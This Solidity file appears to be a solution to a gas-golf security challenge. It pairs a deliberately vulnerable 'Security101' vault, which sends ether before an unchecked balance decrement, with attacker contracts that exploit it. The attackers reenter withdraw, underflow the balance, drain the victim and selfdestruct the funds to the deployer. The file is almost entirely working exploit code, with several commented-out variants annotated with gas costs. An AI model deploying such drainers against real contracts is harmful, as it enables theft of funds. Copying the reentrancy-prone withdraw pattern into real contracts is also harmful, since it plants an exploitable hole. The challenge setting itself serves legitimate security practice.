// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

// Gas Used - Current gas use: 220897
contract OptimizedAttackerSecurity101 {
    constructor(address _address) payable {
        // Creates a new instance of Attack contract and calls the attack function
        address attack = address(new Attack{value: 2}(_address));
        (bool ok, ) = attack.call('');
        require(ok, 'not ok');
        selfdestruct(payable(msg.sender));
    }
}

contract Attack {
    Security101 private immutable victim;

    constructor(address _address) payable {
        victim = Security101(_address);
        victim.deposit{value: 2}();
    }

    // Separate repeated operations as internal functions - Calling an external function
    // involves storing a padded function selector to memory, which consumes at least 32 bytes.
    // Separating the call cuts down the size of two withdraw calls to half.
    function _withdrawInt(uint256 val) internal {
        victim.withdraw(val);
    }

    fallback() external payable {
        if (address(this).balance < 3) {
            _withdrawInt(2);
            if (gasleft() <= 0x10A9E) {
                _withdrawInt(address(victim).balance);
            }
        }
    }
}

// Gas Used - Current gas use: 237653
// contract OptimizedAttackerSecurity101 {
//     constructor(address _address) payable {
//         // Creates a new instance of Attack contract and calls the attack function
//         (new Attack{value: 1 wei}(_address)).attack();
//         selfdestruct(payable(msg.sender));
//     }
// }

// contract Attack {
//     Security101 private immutable victim;

//     constructor(address _address) payable {
//         victim = Security101(_address);
//         victim.deposit{value: 1}();
//     }

//     function attack() external payable {
//         Security101 _victim = victim;
//         _withdrawInt(1);
//         _withdrawInt(address(_victim).balance);
//         selfdestruct(payable(tx.origin));
//     }

//     // Separate repeated operations as internal functions - Calling an external function
//     // involves storing a padded function selector to memory, which consumes at least 32 bytes.
//     // Separating the call cuts down the size of two withdraw calls to half.
//     function _withdrawInt(uint256 val) internal {
//         victim.withdraw(val);
//     }

//     receive() external payable {
//         if (address(this).balance == 1 wei) {
//             _withdrawInt(1);
//         }
//     }
// }

// // Gas Used - Current gas use: 258321
// contract OptimizedAttackerSecurity101 {
//     constructor(address _address) payable {
//         // Creates a new instance of Attack contract and calls the attack function
//         (new Attack{value: 1 wei}(_address)).attack();
//         selfdestruct(payable(msg.sender));
//     }
// }

// contract Attack {
//     Security101 private immutable victim;

//     constructor(address _address) payable {
//         victim = Security101(_address);
//     }

//     function attack() external payable {
//         Security101 _victim = victim;
//         _victim.deposit{value: 1}();
//         _withdrawInt(1);
//         _withdrawInt(address(_victim).balance);
//         selfdestruct(payable(tx.origin));
//     }

//     // Separate repeated operations as internal functions - Calling an external function
//     // involves storing a padded function selector to memory, which consumes at least 32 bytes.
//     // Separating the call cuts down the size of two withdraw calls to half.
//     function _withdrawInt(uint256 val) internal {
//         victim.withdraw(val);
//     }

//     receive() external payable {
//         if (address(this).balance == 1 wei) {
//             _withdrawInt(1);
//         }
//     }
// }

// Gas Used - Current gas use: 305011
// contract OptimizedAttackerSecurity101 {
//     constructor(address _address) payable {
//         // Creates a new instance of Attack contract and calls the attack function
//         (new Attack{value: 1 wei}(_address)).attack();
//         selfdestruct(payable(msg.sender));
//     }
// }

// contract Attack {
//     Security101 private immutable victim;

//     constructor(address _address) payable {
//         victim = Security101(_address);
//     }

//     function attack() external payable {
//         Security101 _victim = victim;
//         _victim.deposit{value: 1}();
//         _victim.withdraw(1);
//         _victim.withdraw(address(_victim).balance);
//         selfdestruct(payable(tx.origin));
//     }

//     receive() external payable {
//         if (address(this).balance == 1 wei) {
//             victim.withdraw(1);
//         }
//     }
// }

// Gas Used - Current gas use: 305011
// contract OptimizedAttackerSecurity101 {
//     constructor(Security101 _address) payable {
//         // Creates a new instance of Attack contract and calls the attack function
//         (new Attack()).attack{value: msg.value}(_address);
//     }
// }

// contract Attack {
//     function attack(Security101 _victim) external payable {
//         _victim.deposit{value: 2}();
//         _victim.withdraw(2);
//         _victim.withdraw(address(_victim).balance);
//     }

//     receive() external payable {
//         if (msg.value != 2) return;
//         Security101(msg.sender).withdraw(1);
//     }
// }

// Gas Used - Current gas use: 393184
// contract OptimizedAttackerSecurity101 {
//     constructor(address _address) payable {
//         // Creates a new instance of Attack contract and calls the attack function
//         (new Attack()).attack{value: msg.value}(_address);
//     }
// }

// interface ISecurity101 {
//     function deposit() external payable;

//     function withdraw(uint256 _amount) external;
// }

// contract Attack {
//     bool private fallbackCalled;
//     ISecurity101 public security101;

//     function attack(address _address) external payable {
//         security101 = ISecurity101(_address);
//         security101.deposit{value: msg.value}(); // Deposits one ether
//         security101.withdraw(msg.value); // Withdraws 1 ether and triggers reenterancy
//         // Withdraw the entire balance of the victim contract
//         security101.withdraw(address(security101).balance);
//     }

//     receive() external payable {
//         // Simply withdraws one more ether and underflows to max value of uint as the
//         // victim contract uses unchecked.
//         if (!fallbackCalled) {
//             fallbackCalled = true;
//             security101.withdraw(1 ether);
//         }
//     }
// }
